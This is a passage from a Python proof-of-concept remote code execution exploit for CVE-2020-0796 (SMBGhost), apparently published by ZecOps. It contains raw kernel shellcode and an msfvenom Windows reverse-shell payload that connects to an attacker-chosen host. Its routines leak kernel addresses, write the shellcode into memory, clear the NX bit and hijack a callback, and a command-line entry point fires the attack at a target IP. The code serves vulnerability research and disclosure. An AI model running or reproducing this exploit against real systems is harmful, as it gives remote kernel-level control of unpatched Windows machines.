        result = read_what_where_once(ip_address, srvnet_base_ptr, allocation_pool_object_ptr, size, where)
        if result != None:
            break

        print('\nLeak failed, retrying')

    return result

def get_pt_from_va(address, pte_base):
    address >>= 9
    address &= 0x7FFFFFFFF8
    address += pte_base
    return address

def smbghost_kshellcode_x64(ip, port):
    # nasm smbghost_kshellcode_x64.asm
    kmode = b'\x55\xe8\x07\x00\x00\x00\xe8\x19\x00\x00\x00\x5d\xc3\x48\x8d\x2d\x00\x10\x00\x00\x48\xc1\xed\x0c\x48\xc1\xe5\x0c\x48\x81\xed\x00\x02\x00\x00\xc3\x41\x57\x41\x56\x57\x56\x53\x48\x83\xec\x20\x49\x89\xcf\x4c\x89\x7d\x08\x65\x4c\x8b\x34\x25\x88\x01\x00\x00\xbf\x3f\x5f\x64\x77\xe8\x2a\x01\x00\x00\x8b\x40\x03\x89\xc3\x3d\x00\x04\x00\x00\x72\x03\x83\xc0\x10\x48\x8d\x50\x28\x4c\x89\xf1\xbf\xb4\x9f\x9b\x78\xe8\x03\x01\x00\x00\x4c\x8d\x04\x10\x4d\x89\xc1\x4d\x8b\x09\x4d\x39\xc8\x0f\x84\xe4\x00\x00\x00\x4c\x89\xc8\x4c\x29\xf0\x48\x3d\x00\x07\x00\x00\x77\xe6\x4d\x29\xce\xbf\x78\x7c\xf4\xdb\xe8\xd5\x00\x00\x00\x48\x91\xbf\xe1\x14\x01\x17\xe8\xd0\x00\x00\x00\x8b\x78\x03\x83\xc7\x08\x31\xc0\x48\x8d\x34\x19\x50\xe8\x06\x01\x00\x00\x3d\xd8\x83\xe0\x3e\x58\x74\x1e\x48\xff\xc0\x48\x3d\x00\x03\x00\x00\x75\x0a\x31\xc9\x88\x4d\xf8\xe9\x8e\x00\x00\x00\x48\x8b\x0c\x39\x48\x29\xf9\xeb\xd0\xbf\x48\xb8\x18\xb8\xe8\x87\x00\x00\x00\x48\x89\x45\xf0\x48\x8d\x34\x11\x48\x89\xf3\x48\x8b\x5b\x08\x48\x39\xde\x74\xf7\x4a\x8d\x14\x33\xbf\x3e\x4c\xf8\xce\xe8\x6c\x00\x00\x00\x8b\x40\x03\x48\x83\x7c\x02\xf8\x00\x74\xde\x48\x8d\x4d\x30\x4d\x31\xc0\x4c\x8d\x0d\xac\x00\x00\x00\x55\x6a\x01\x55\x41\x50\x48\x83\xec\x20\xbf\xc4\x5c\x19\x6d\xe8\x38\x00\x00\x00\x48\x8d\x4d\x30\x4d\x31\xc9\xbf\x34\x46\xcc\xaf\xe8\x27\x00\x00\x00\x48\x83\xc4\x40\x85\xc0\x74\xa3\x48\x8b\x45\x40\xf6\x40\x1a\x02\x75\x09\x48\x89\x00\x48\x89\x40\x08\xeb\x90\x48\x83\xc4\x20\x5b\x5e\x5f\x41\x5e\x41\x5f\xc3\xe8\x02\x00\x00\x00\xff\xe0\x53\x51\x56\x41\x8b\x47\x3c\x41\x8b\x84\x07\x88\x00\x00\x00\x4c\x01\xf8\x50\x8b\x48\x18\x8b\x58\x20\x4c\x01\xfb\xff\xc9\x8b\x34\x8b\x4c\x01\xfe\xe8\x1f\x00\x00\x00\x39\xf8\x75\xef\x58\x8b\x58\x24\x4c\x01\xfb\x66\x8b\x0c\x4b\x8b\x58\x1c\x4c\x01\xfb\x8b\x04\x8b\x4c\x01\xf8\x5e\x59\x5b\xc3\x52\x31\xc0\x99\xac\xc1\xca\x0d\x01\xc2\x85\xc0\x75\xf6\x92\x5a\xc3\x55\x53\x57\x56\x41\x57\x49\x8b\x28\x4c\x8b\x7d\x08\x52\x5e\x4c\x89\xcb\x31\xc0\x44\x0f\x22\xc0\x48\x89\x02\x89\xc1\x48\xf7\xd1\x49\x89\xc0\xb0\x40\x50\xc1\xe0\x06\x50\x49\x89\x01\x48\x83\xec\x20\xbf\xea\x99\x6e\x57\xe8\x65\xff\xff\xff\x48\x83\xc4\x30\x85\xc0\x75\x45\x48\x8b\x3e\x48\x8d\x35\x4d\x00\x00\x00\xb9\x80\x03\x00\x00\xf3\xa4\x48\x8b\x45\xf0\x48\x8b\x40\x18\x48\x8b\x40\x20\x48\x8b\x00\x66\x83\x78\x48\x18\x75\xf6\x48\x8b\x50\x50\x81\x7a\x0c\x33\x00\x32\x00\x75\xe9\x4c\x8b\x78\x20\xbf\x5e\x51\x5e\x83\xe8\x22\xff\xff\xff\x48\x89\x03\x31\xc9\x88\x4d\xf8\xb1\x01\x44\x0f\x22\xc1\x41\x5f\x5e\x5f\x5b\x5d\xc3\x48\x92\x31\xc9\x51\x51\x49\x89\xc9\x4c\x8d\x05\x0d\x00\x00\x00\x89\xca\x48\x83\xec\x20\xff\xd0\x48\x83\xc4\x30\xc3'

    # msfvenom -a x64 --platform windows -p windows/x64/shell_reverse_tcp lhost=192.168.56.1 lport=443 -f python -v shellcode
    umode = b'\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41'
    umode += b'\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48'
    umode += b'\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20'
    umode += b'\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31'
    umode += b'\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20'
    umode += b'\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41'
    umode += b'\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0'
    umode += b'\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67'
    umode += b'\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20'
    umode += b'\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34'
    umode += b'\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac'
    umode += b'\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1'
    umode += b'\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58'
    umode += b'\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c'
    umode += b'\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04'
    umode += b'\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a'
    umode += b'\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41'
    umode += b'\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9'
    umode += b'\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f'
    umode += b'\x33\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81'
    umode += b'\xec\xa0\x01\x00\x00\x49\x89\xe5\x49\xbc\x02'
    umode += b'\x00' + struct.pack('>H', port) + socket.inet_aton(ip) + b'\x41\x54\x49\x89'
    umode += b'\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff'
    umode += b'\xd5\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41'
    umode += b'\xba\x29\x80\x6b\x00\xff\xd5\x50\x50\x4d\x31'
    umode += b'\xc9\x4d\x31\xc0\x48\xff\xc0\x48\x89\xc2\x48'
    umode += b'\xff\xc0\x48\x89\xc1\x41\xba\xea\x0f\xdf\xe0'
    umode += b'\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89'
    umode += b'\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff'
    umode += b'\xd5\x48\x81\xc4\x40\x02\x00\x00\x49\xb8\x63'
    umode += b'\x6d\x64\x00\x00\x00\x00\x00\x41\x50\x41\x50'
    umode += b'\x48\x89\xe2\x57\x57\x57\x4d\x31\xc0\x6a\x0d'
    umode += b'\x59\x41\x50\xe2\xfc\x66\xc7\x44\x24\x54\x01'
    umode += b'\x01\x48\x8d\x44\x24\x18\xc6\x00\x68\x48\x89'
    umode += b'\xe6\x56\x50\x41\x50\x41\x50\x41\x50\x49\xff'
    umode += b'\xc0\x41\x50\x49\xff\xc8\x4d\x89\xc1\x4c\x89'
    umode += b'\xc1\x41\xba\x79\xcc\x3f\x86\xff\xd5\x48\x31'
    umode += b'\xd2\x48\xff\xca\x8b\x0e\x41\xba\x08\x87\x1d'
    umode += b'\x60\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6'
    umode += b'\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06'
    umode += b'\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72'
    umode += b'\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5'

    return kmode + umode

def exploit(ip_address, reverse_shell_ip, reverse_shell_port):
    global socks_to_keep_alive
    socks_to_keep_alive = []

    allocation_pool_object_ptr = leak_allocation_pool_object_ptr(ip_address)
    print(f'Leaked pool allocation address: {hex(allocation_pool_object_ptr)}')

    srvnet_base_ptr = leak_srvnet_base_ptr(ip_address, allocation_pool_object_ptr)
    print(f'Leaked srvnet.sys base address: {hex(srvnet_base_ptr)}')

    read_address = srvnet_base_ptr + OFFSETS['srvnet!imp_IoSizeofWorkItem']
    address = read_what_where(ip_address, srvnet_base_ptr, allocation_pool_object_ptr, 6, read_address)
    address = struct.unpack('<Q', address + b'\xff\xff')[0]
    nt_base_ptr = address - OFFSETS['nt!IoSizeofWorkItem']
    print(f'Leaked ntoskrnl base address: {hex(nt_base_ptr)}')

    read_address = nt_base_ptr + OFFSETS['nt!MiGetPteAddress'] + 0x13
    address = read_what_where(ip_address, srvnet_base_ptr, allocation_pool_object_ptr, 6, read_address)
    pte_base = struct.unpack('<Q', address + b'\xff\xff')[0]
    print(f'Leaked PTE base address: {hex(pte_base)}')

    # Use the classic KUSER_SHARED_DATA address for our shellcode.
    shellcode = smbghost_kshellcode_x64(reverse_shell_ip, reverse_shell_port)
    shellcode_address = 0xFFFFF78000000800
    write_what_where(ip_address, shellcode, shellcode_address)
    print('Wrote shellcode')

    shellcode_pte = get_pt_from_va(shellcode_address, pte_base)
    modify_address = shellcode_pte + 7
    pte_bits = read_what_where(ip_address, srvnet_base_ptr, allocation_pool_object_ptr, 1, modify_address)
    pte_bits = bytes([pte_bits[0] & 0x7F])  # clear NX bit
    write_what_where(ip_address, pte_bits, modify_address)
    print('Cleared NX bit for shellcode execution')

    # Run the shellcode!
    callback_ptr = struct.pack('<Q', shellcode_address)
    callback_ptr_address = allocation_pool_object_ptr + 0x50 + 0x1600
    write_what_where(ip_address, callback_ptr, callback_ptr_address)
    call_function(ip_address, callback_ptr_address, nt_base_ptr)

    input('Press Enter to disconnect and exit the POC - target will probably crash')

    # Bye!
    for sock in socks_to_keep_alive:
        sock.close()

if __name__ == "__main__":
    print('CVE-2020-0796 Remote Code Execution POC')
    print('(c) 2020 ZecOps, Inc.')
    print('')

    if len(sys.argv) != 4:
        exit(f'Usage: {sys.argv[0]} target_ip reverse_shell_ip reverse_shell_port')

    target_ip, reverse_shell_ip, reverse_shell_port = sys.argv[1:4]

    if not is_target_vulnerable(target_ip):
        exit('Target is not vulnerable')

    exploit(target_ip, reverse_shell_ip, int(reverse_shell_port))
